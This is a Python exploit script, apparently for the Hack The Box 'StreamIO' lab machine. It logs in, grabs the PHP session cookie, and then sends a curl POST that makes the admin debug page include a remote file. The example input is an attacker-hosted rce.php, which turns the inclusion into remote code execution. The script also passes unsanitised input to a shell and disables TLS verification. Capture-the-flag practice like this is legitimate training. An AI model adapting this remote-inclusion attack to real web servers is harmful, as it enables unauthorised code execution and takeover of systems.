import subprocess

import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning



# Suppress only the InsecureRequestWarning from urllib3 needed for this script.

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



def authenticate_and_send_request(login_url, admin_url, username, password, include_content):

    try:

        # Create a session to handle cookies

        session = requests.Session()



        # Authenticate using provided username and password at the login URL

        auth_response = session.post(login_url, data={'username': username, 'password': password}, verify=False)



        # Check if authentication was successful based on a specific condition in the response content

        if "Log into your account" not in auth_response.text:

            print("Authentication successful!")



            # Obtain PHPSESSID from the session cookies

            php_session_id = session.cookies.get('PHPSESSID')

            if php_session_id:

                print(f"PHPSESSID: {php_session_id}")



                # Use curl to send the request with authentication, include the provided content

                curl_command = (

                    f"curl -X POST '{admin_url}' -d 'include={include_content}' -b 'PHPSESSID={php_session_id}' -k -s"  # -s flag suppresses output

                )



                # Execute the curl command

                subprocess.run(curl_command, shell=True, check=True, stdout=subprocess.PIPE)



                print("Request sent successfully.")

            else:

                print("PHPSESSID not found in session cookies.")

        else:

            print("Authentication failed. Invalid credentials.")



    except Exception as e:

        # Handle any exceptions that might occur during the request

        print(f"An error occurred: {e}")



# Example usage:

login_url = "https://streamio.htb/login.php"  # Update with the correct login URL

admin_url = "https://streamio.htb/admin/index.php?debug=master.php"  # Update with the correct admin URL

input_username = input("Enter your username: ")

input_password = input("Enter your password: ")

input_include_content = input("Enter the content to include (e.g., http://10.10.14.31:5000/rce.php): ")



authenticate_and_send_request(login_url, admin_url, input_username, input_password, input_include_content)

